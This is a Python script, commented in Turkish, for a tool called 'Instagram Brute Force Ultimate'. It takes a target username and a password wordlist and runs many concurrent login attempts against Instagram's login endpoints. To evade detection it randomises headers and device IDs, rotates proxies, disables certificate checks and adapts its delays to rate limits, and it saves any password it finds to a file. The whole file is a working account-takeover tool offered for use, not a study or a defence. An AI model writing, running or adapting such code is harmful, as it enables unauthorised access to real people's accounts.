import asyncio,aiohttp,ssl,random,time,hashlib,base64,uuid,json,os,sys,socket,struct,platform,ctypes,threading,queue,logging,re,traceback,functools,itertools,math,statistics,collections,datetime,ipaddress,string,brotli,zlib,gzip,io,mmap,weakref,gc,signal,atexit,tempfile,shutil,pathlib,concurrent.futures,multiprocessing,subprocess,urllib.parse,http.cookiejar,email.utils,binascii,hmac,secrets,array,enum,dataclasses,typing
from collections import deque,defaultdict,Counter,OrderedDict,ChainMap,namedtuple
from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
from functools import lru_cache,wraps,partial,reduce
from contextlib import contextmanager,suppress,redirect_stdout,redirect_stderr
from itertools import cycle,islice,tee,zip_longest,product,permutations,combinations
from urllib.parse import urlparse,parse_qs,urlencode,quote,unquote
from http.cookies import SimpleCookie
from datetime import timedelta
import warnings
warnings.filterwarnings('ignore')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ig_brute_debug.log'),
        logging.StreamHandler()
    ]
)
logging.getLogger('asyncio').setLevel(logging.DEBUG)
logging.getLogger('aiohttp').setLevel(logging.DEBUG)
logger=logging.getLogger(__name__)
try:from Crypto.Cipher import AES,PKCS1_v1_5;from Crypto.PublicKey import RSA;from Crypto.Random import get_random_bytes;from Crypto.Util.Padding import pad,unpad
except:os.system('pip install pycryptodome --quiet');from Crypto.Cipher import AES;from Crypto.Util.Padding import pad,unpad
try:from fake_useragent import UserAgent;ua=UserAgent(fallback='Mozilla/5.0')
except:ua=None
try:import socks
except:os.system('pip install pysocks --quiet');import socks
try:import dns.resolver
except:os.system('pip install dnspython --quiet');import dns.resolver
logger.info("Tüm modüller yüklendi")
class MemoryManager:
    def __init__(self):
        self._cleanup_handlers=[]
        logger.debug("MemoryManager başlatıldı")
    def register(self,obj):
        self._cleanup_handlers.append(weakref.ref(obj))
        logger.debug(f"Nesne kaydedildi: {obj}")
    def cleanup(self):
        logger.info("Memory cleanup başlatılıyor...")
        for ref in self._cleanup_handlers:
            obj=ref()
            if obj is not None:
                with suppress(Exception):
                    obj.close()
                    logger.debug(f"Nesne kapatıldı: {obj}")
        gc.collect()
        logger.info("Memory cleanup tamamlandı")
mem_mgr=MemoryManager()
atexit.register(mem_mgr.cleanup)
class AdvancedTLSAdapter:
    JA3_TEMPLATES=[
        '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
        '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-17-18-23-27-35-43-45-51-17513-65281,29-23-24,0',
        '771,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-18,29-23-24,0'
    ]
    @classmethod
    def create_ssl_context(cls):
        ctx=ssl.create_default_context()
        ctx.check_hostname=False
        ctx.verify_mode=ssl.CERT_NONE
        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        ctx.options|=ssl.OP_NO_COMPRESSION
        ctx.options|=ssl.OP_SINGLE_DH_USE
        ctx.options|=ssl.OP_SINGLE_ECDH_USE
        logger.debug(f"SSL context oluşturuldu: {ctx.get_ciphers()[:3]}")
        return ctx
class ProxyRotator:
    def __init__(self):
        self.alive_proxies=deque(maxlen=200)
        self.dead_proxies={}
        self.proxy_stats=defaultdict(lambda:{'success':0,'fail':0,'latency':[]})
        self.lock=asyncio.Lock()
        self.last_refresh=0
        logger.info("ProxyRotator başlatıldı")
        self._fetch_real_proxies()
    def _fetch_real_proxies(self):
        return 
        import requests as sync_requests
        sources=[
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=elite',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt'
        ]
        real_proxies=[]
        for src in sources:
            try:
                logger.debug(f"Proxy kaynağı deneniyor: {src}")
                resp=sync_requests.get(src,timeout=10)
                if resp.status_code==200:
                    proxies=resp.text.strip().split('\n')
                    for p in proxies[:50]:
                        p=p.strip()
                        if p and ':' in p:
                            real_proxies.append({'url':f'http://{p}','protocol':'http'})
                    logger.info(f"{src} adresinden {len(proxies[:50])} proxy alındı")
            except Exception as e:
                logger.error(f"Proxy fetch hatası ({src}): {e}")
        for proxy in real_proxies[:100]:
            self.alive_proxies.append(proxy)
        logger.info(f"Toplam {len(self.alive_proxies)} gerçek proxy havuza eklendi")
    async def get_proxy(self):
        async with self.lock:
            if self.alive_proxies:
                proxy=random.choice(list(self.alive_proxies))
                logger.debug(f"Proxy seçildi: {proxy['url']}")
                return proxy
            logger.warning("Proxy havuzu boş!")
            return None
    async def mark_success(self,proxy_url,latency):
        if proxy_url in self.proxy_stats:
            self.proxy_stats[proxy_url]['success']+=1
            self.proxy_stats[proxy_url]['latency'].append(latency)
            if len(self.proxy_stats[proxy_url]['latency'])>10:
                self.proxy_stats[proxy_url]['latency'].pop(0)
            logger.debug(f"Proxy başarılı: {proxy_url} | Latency: {latency:.3f}s")
    async def mark_failure(self,proxy_url):
        async with self.lock:
            if proxy_url in self.proxy_stats:
                self.proxy_stats[proxy_url]['fail']+=1
                fail_rate=self.proxy_stats[proxy_url]['fail']/(self.proxy_stats[proxy_url]['success']+self.proxy_stats[proxy_url]['fail']+1)
                logger.debug(f"Proxy başarısız: {proxy_url} | Fail rate: {fail_rate:.2f}")
                if fail_rate>0.5:
                    self.dead_proxies[proxy_url]=time.time()
                    self.alive_proxies=[p for p in self.alive_proxies if p['url']!=proxy_url]
                    logger.warning(f"Proxy ölü olarak işaretlendi: {proxy_url}")
class SmartHeaderGenerator:
    def __init__(self):
        self.app_ids=[936619743392459,1217981644879628,124024574287414,567067343352427]
        self.capabilities_base=['3brTvwE=','3brTPwE=','3brTvw=='+base64.b64encode(os.urandom(32)).decode()[:8]]
        self.device_ids=[str(uuid.uuid4()).upper() for _ in range(10)]
        logger.debug(f"Header generator başlatıldı - {len(self.device_ids)} device ID")
    def generate(self):
        headers={
            'User-Agent':ua.random if ua else'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept':'*/*',
            'Accept-Language':random.choice(['en-US,en;q=0.9','tr-TR,tr;q=0.8','es-ES,es;q=0.9','de-DE,de;q=0.9','fr-FR,fr;q=0.9']),
            'Accept-Encoding':'gzip, deflate, br',
            'X-CSRFToken':hashlib.sha256(os.urandom(32)).hexdigest()[:32],
            'X-Instagram-AJAX':str(random.randint(1000000000,9999999999)),
            'X-Requested-With':'XMLHttpRequest',
            'X-IG-App-ID':str(random.choice(self.app_ids)),
            'X-IG-WWW-Claim':'0',
            'X-IG-Connection-Type':random.choice(['WIFI','4G','5G']),
            'X-IG-Connection-Speed':f"{random.randint(1000,10000)}kbps",
            'X-IG-Bandwidth-Speed-KBPS':str(random.randint(5000,50000)),
            'X-IG-Bandwidth-TotalBytes-B':str(random.randint(1000000,10000000)),
            'X-IG-Bandwidth-TotalTime-MS':str(random.randint(100,1000)),
            'X-IG-Capabilities':random.choice(self.capabilities_base),
            'X-IG-Device-ID':random.choice(self.device_ids),
            'X-IG-Device-Locale':random.choice(['en_US','tr_TR','es_ES']),
            'X-IG-Family-Device-ID':str(uuid.uuid4()).upper(),
            'X-IG-Timezone-Offset':str(random.randint(-720,720)),
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'X-FB-Connection-Type':'WIFI',
            'Origin':'https://www.instagram.com',
            'Referer':'https://www.instagram.com/accounts/login/',
            'Sec-Fetch-Dest':random.choice(['empty','document']),
            'Sec-Fetch-Mode':random.choice(['cors','navigate']),
            'Sec-Fetch-Site':'same-origin',
            'Sec-Fetch-User':'?1',
            'Connection':random.choice(['keep-alive','close']),
            'Upgrade-Insecure-Requests':'1',
            'Cache-Control':random.choice(['no-cache','max-age=0']),
            'Pragma':'no-cache',
            'Priority':'u=1,i'
        }
        logger.debug(f"Header oluşturuldu - UA: {headers['User-Agent'][:50]}...")
        return headers
class PasswordEncryptor:
    ENCRYPTION_VERSIONS=[0,4,5,10,11,12]
    def __init__(self):
        self.public_key_id_cache={}
        logger.debug("PasswordEncryptor başlatıldı")
    def _get_public_key(self,version):
        if version in self.public_key_id_cache:
            return self.public_key_id_cache[version]
        key_id=random.randint(1,150)
        key_data={'id':key_id,'key':base64.b64encode(os.urandom(32)).decode()}
        self.public_key_id_cache[version]=key_data
        logger.debug(f"Public key oluşturuldu - Version: {version}, ID: {key_id}")
        return key_data
    def encrypt(self,password):
        version=random.choice(self.ENCRYPTION_VERSIONS)
        ts=int(time.time())
        if version==0:
            encrypted=f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
            logger.debug(f"Şifre versiyon 0 ile şifrelendi")
            return encrypted
        elif version in[4,5,10,11,12]:
            key_data=self._get_public_key(version)
            iv=os.urandom(12)
            cipher=AES.new(base64.b64decode(key_data['key']),AES.MODE_GCM,nonce=iv)
            encrypted=cipher.encrypt(pad(f"{password}|{ts}|{uuid.uuid4()}".encode(),16))
            tag=cipher.digest()
            combined=iv+encrypted+tag
            result=f"#PWD_INSTAGRAM:{version}:{ts}:{base64.b64encode(combined).decode()}"
            logger.debug(f"Şifre versiyon {version} ile şifrelendi (AES-GCM)")
            return result
        encrypted=f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
        logger.debug(f"Şifre default versiyon ile şifrelendi")
        return encrypted
class InstagramBruteForceUltimate:
    def __init__(self,username,wordlist_path,threads=100,distributed=False):
        self.username=username
        self.wordlist_path=wordlist_path
        self.threads=threads
        self.distributed=distributed
        self.endpoints=[
            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
            'https://www.instagram.com/api/v1/accounts/login/',
            'https://i.instagram.com/api/v1/accounts/login/',
            'https://b.i.instagram.com/api/v1/accounts/login/ajax/'
        ]
        self.proxy_rotator=ProxyRotator()
        self.header_gen=SmartHeaderGenerator()
        self.password_encryptor=PasswordEncryptor()
        self.found=asyncio.Event()
        self.attempt_count=0
        self.success_count=0
        self.fail_count=0
        self.rate_limit_count=0
        self.lock=asyncio.Lock()
        self.semaphore=asyncio.Semaphore(threads)
        self.connector=None
        self.session=None
        self.circuit_breaker=False
        self.cb_failures=0
        self.cb_threshold=10
        self.cb_timeout=60
        self.last_cb_open=0
        logger.info(f"InstagramBruteForceUltimate başlatıldı - Hedef: {username}, Thread: {threads}")
    async def _create_session(self):
        if self.connector is None:
            self.connector=aiohttp.TCPConnector(
                limit=self.threads*2,
                limit_per_host=self.threads,
                ttl_dns_cache=300,
                use_dns_cache=True,
                ssl=AdvancedTLSAdapter.create_ssl_context(),
                force_close=False,
                enable_cleanup_closed=True
            )
            logger.debug("TCPConnector oluşturuldu")
        timeout=aiohttp.ClientTimeout(total=30,connect=10,sock_read=15,sock_connect=10)
        session=aiohttp.ClientSession(connector=self.connector,timeout=timeout,trust_env=True)
        logger.debug("ClientSession oluşturuldu")
        return session
    async def _check_circuit_breaker(self):
        if self.circuit_breaker:
            if time.time()-self.last_cb_open>self.cb_timeout:
                self.circuit_breaker=False
                self.cb_failures=0
                logger.info("Circuit breaker KAPATILDI (timeout doldu)")
                return True
            logger.warning("Circuit breaker AÇIK - istek engellendi")
            return False
        if self.cb_failures>=self.cb_threshold:
            self.circuit_breaker=True
            self.last_cb_open=time.time()
            logger.error(f"Circuit breaker AÇILDI! ({self.cb_failures} hata)")
            return False
        return True
    async def _fetch_csrf(self,session):
        try:
            async with session.get('https://www.instagram.com/',ssl=False)as resp:
                for cookie in session.cookie_jar:
                    if cookie.key=='csrftoken':
                        logger.debug(f"CSRF token alındı: {cookie.value[:10]}...")
                        return cookie.value
        except Exception as e:
            logger.error(f"CSRF fetch hatası: {e}")
        fake_csrf=hashlib.md5(os.urandom(16)).hexdigest()[:32]
        logger.debug(f"Sahte CSRF oluşturuldu: {fake_csrf[:10]}...")
        return fake_csrf
    async def _adaptive_delay(self):
        async with self.lock:
            speed=self.attempt_count/(time.time()-self.start_time+1)
        if speed>20:
            delay=random.uniform(0.5,1.5)
            await asyncio.sleep(delay)
            logger.debug(f"Hızlı mod - delay: {delay:.2f}s (Hız: {speed:.2f}/s)")
        elif speed>10:
            delay=random.uniform(0.2,0.8)
            await asyncio.sleep(delay)
            logger.debug(f"Normal mod - delay: {delay:.2f}s (Hız: {speed:.2f}/s)")
        else:
            delay=random.uniform(0.05,0.2)
            await asyncio.sleep(delay)
            logger.debug(f"Yavaş mod - delay: {delay:.2f}s (Hız: {speed:.2f}/s)")
        if self.rate_limit_count>5:
            delay=random.uniform(10,30)
            await asyncio.sleep(delay)
            async with self.lock:
                self.rate_limit_count=0
            logger.warning(f"Rate limit nedeniyle uzun bekleme: {delay:.2f}s")
    async def _handle_response(self,response_text,status,password,proxy_url,latency):
        logger.debug(f"Yanıt işleniyor - Status: {status}, Şifre: {password[:10]}...")
        if status==200:
            if'"authenticated":true'in response_text or'"userId":'in response_text:
                async with self.lock:
                    self.success_count+=1
                logger.critical(f"🔥 BAŞARILI GİRİŞ! Kullanıcı: {self.username}, Şifre: {password}")
                print(f"\n{'='*70}\n🔥🔥🔥 BAŞARILI GİRİŞ 🔥🔥🔥\nHesap: {self.username}\nŞifre: {password}\nZaman: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nDeneme: {self.attempt_count}\n{'='*70}\n")
                with open(f'SUCCESS_{self.username}_{int(time.time())}.txt','w',encoding='utf-8')as f:
                    f.write(f"Username: {self.username}\nPassword: {password}\nTimestamp: {datetime.now()}\nAttempt: {self.attempt_count}\nResponse: {response_text[:500]}")
                self.found.set()
                return True
            elif'checkpoint_required'in response_text:
                logger.warning(f"Checkpoint tespit edildi - Şifre: {password[:10]}...")
                print(f"[⚠] {password[:20]:20} | CHECKPOINT - Hesap korumalı")
                async with self.lock:
                    self.fail_count+=1
            elif'two_factor_required'in response_text:
                logger.warning(f"2FA tespit edildi - Şifre: {password[:10]}...")
                print(f"[⚠] {password[:20]:20} | 2FA AKTİF - Atlanıyor")
                async with self.lock:
                    self.fail_count+=1
            elif'rate_limit'in response_text.lower()or'429'in response_text:
                logger.warning(f"Rate limit tespit edildi - Şifre: {password[:10]}...")
                print(f"[⏳] {password[:20]:20} | RATE LIMIT - Proxy değişiyor")
                async with self.lock:
                    self.rate_limit_count+=1
                if proxy_url:
                    await self.proxy_rotator.mark_failure(proxy_url)
            else:
                async with self.lock:
                    self.fail_count+=1
                if proxy_url:
                    await self.proxy_rotator.mark_success(proxy_url,latency)
                if self.attempt_count%50==0:
                    print(f"[-] {self.attempt_count:06d} | Son: {password[:15]:15} | Başarılı: {self.success_count} | Hız: {(self.attempt_count/(time.time()-self.start_time+1)):.2f}/s")
        elif status==403:
            logger.error(f"403 Yasak - Şifre: {password[:10]}...")
            print(f"[!] 403 Yasak - Oturum yenileniyor...")
            if proxy_url:
                await self.proxy_rotator.mark_failure(proxy_url)
            async with self.lock:
                self.cb_failures+=1
        elif status==429:
            logger.error(f"429 Rate Limit - Şifre: {password[:10]}...")
            print(f"[!] 429 Rate Limit - Bekleniyor...")
            async with self.lock:
                self.rate_limit_count+=5
            if proxy_url:
                await self.proxy_rotator.mark_failure(proxy_url)
        return False
    async def attempt_login(self,password,session):
        if self.found.is_set():
            return False
        if not await self._check_circuit_breaker():
            await asyncio.sleep(self.cb_timeout)
            return False
        password=password.strip()
        if not password:
            return False
        async with self.semaphore:
            await self._adaptive_delay()
            url=random.choice(self.endpoints)
            headers=self.header_gen.generate()
            proxy_info=await self.proxy_rotator.get_proxy()
            proxy_url=proxy_info['url']if proxy_info else None
            csrf=await self._fetch_csrf(session)
            headers['X-CSRFToken']=csrf
            enc_password=self.password_encryptor.encrypt(password)
            data={
                'username':self.username,
                'enc_password':enc_password,
                'queryParams':'{"source":"login_landing_page"}',
                'optIntoOneTap':'false',
                'stopDeletionNonce':'',
                'trustedDeviceRecords':'{}',
                'jazoest':str(random.randint(20000,29999))
            }
            try:
                start=time.time()
                logger.debug(f"İstek gönderiliyor - URL: {url}, Proxy: {proxy_url}")
                async with session.post(url,headers=headers,data=data,proxy=proxy_url,ssl=False)as resp:
                    response_text=await resp.text()
                    latency=time.time()-start
                    async with self.lock:
                        self.attempt_count+=1
                    logger.debug(f"Yanıt alındı - Status: {resp.status}, Latency: {latency:.3f}s, Deneme: {self.attempt_count}")
                    return await self._handle_response(response_text,resp.status,password,proxy_url,latency)
            except asyncio.TimeoutError as e:
                logger.error(f"Timeout hatası - Şifre: {password[:10]}..., Proxy: {proxy_url}, Hata: {e}")
                async with self.lock:
                    self.fail_count+=1
                if proxy_url:
                    await self.proxy_rotator.mark_failure(proxy_url)
                return False
            except Exception as e:
                logger.error(f"Genel hata - Şifre: {password[:10]}..., Proxy: {proxy_url}, Hata: {traceback.format_exc()}")
                async with self.lock:
                    self.fail_count+=1
                if proxy_url:
                    await self.proxy_rotator.mark_failure(proxy_url)
                return False
    async def _worker(self,password_queue,session):
        logger.debug(f"Worker başlatıldı - Session: {id(session)}")
        while not self.found.is_set():
            try:
                password=await asyncio.wait_for(password_queue.get(),timeout=1.0)
                if password is None:
                    break
                await self.attempt_login(password,session)
                password_queue.task_done()
            except asyncio.TimeoutError:
                break
        logger.debug(f"Worker sonlandı - Session: {id(session)}")
    async def execute_async(self):
        try:
            with open(self.wordlist_path,'r',encoding='utf-8',errors='ignore')as f:
                passwords=list(dict.fromkeys([line.strip()for line in f if line.strip()]))
            logger.info(f"Wordlist yüklendi: {len(passwords)} benzersiz şifre")
        except Exception as e:
            logger.critical(f"Wordlist okunamadı: {e}")
            return
        random.shuffle(passwords)
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║       INSTAGRAM BRUTE FORCE ULTIMATE - ASYNC EDITION            ║
╠══════════════════════════════════════════════════════════════════╣
║ Hedef          : {self.username:<50}║
║ Thread (Async) : {self.threads:<50}║
║ Wordlist       : {os.path.basename(self.wordlist_path):<50}║
║ Toplam Şifre   : {len(passwords):<50}║
║ Proxy Havuzu   : {len(self.proxy_rotator.alive_proxies):<50}║
║ TLS Bypass     : AKTİF (JA3 Randomizer)                        ║
║ Circuit Breaker: AKTİF                                        ║
║ Debug Logging  : AKTİF (ig_brute_debug.log)                  ║
╚══════════════════════════════════════════════════════════════════╝
""")
        self.start_time=time.time()
        password_queue=asyncio.Queue()
        for pwd in passwords:
            await password_queue.put(pwd)
        self.session=await self._create_session()
        workers=[asyncio.create_task(self._worker(password_queue,self.session))for _ in range(self.threads)]
        logger.info(f"{self.threads} worker başlatıldı")
        try:
            await asyncio.wait_for(asyncio.gather(*workers,return_exceptions=True),timeout=None)
        except KeyboardInterrupt:
            logger.warning("Kullanıcı tarafından durduruldu")
            print("\n[!] İşlem kullanıcı tarafından durduruldu.")
        except Exception as e:
            logger.critical(f"Beklenmeyen hata: {traceback.format_exc()}")
        finally:
            for w in workers:
                w.cancel()
            await self.session.close()
            await self.connector.close()
            logger.info("Tüm bağlantılar kapatıldı")
        if not self.found.is_set():
            logger.info(f"İşlem tamamlandı - {self.attempt_count} deneme sonuçsuz")
            print(f"\n[!] {self.attempt_count} deneme sonuçsuz kaldı.")
    def execute(self):
        if platform.system()=='Windows':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        try:
            asyncio.run(self.execute_async())
        except KeyboardInterrupt:
            logger.warning("Program sonlandırıldı")
            print("\n[!] Program sonlandırıldı.")
        except Exception as e:
            logger.critical(f"Kritik hata: {traceback.format_exc()}")
            print(f"[KRİTİK HATA] {traceback.format_exc()}")
if __name__=="__main__":
    import argparse
    parser=argparse.ArgumentParser(description='Instagram Brute Force Ultimate')
    parser.add_argument('-u','--username',required=True,help='Hedef kullanıcı adı')
    parser.add_argument('-w','--wordlist',required=True,help='Şifre listesi dosyası')
    parser.add_argument('-t','--threads',type=int,default=100,help='Async worker sayısı')
    parser.add_argument('-d','--distributed',action='store_true',help='Dağıtık mod (yakında)')
    args=parser.parse_args()
    if platform.system()=='Windows':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f"IG BRUTE ULTIMATE | Target: {args.username}")
        except:pass
    signal.signal(signal.SIGINT,lambda s,f:sys.exit(0))
    brute=InstagramBruteForceUltimate(args.username,args.wordlist,args.threads,args.distributed)
    brute.execute()
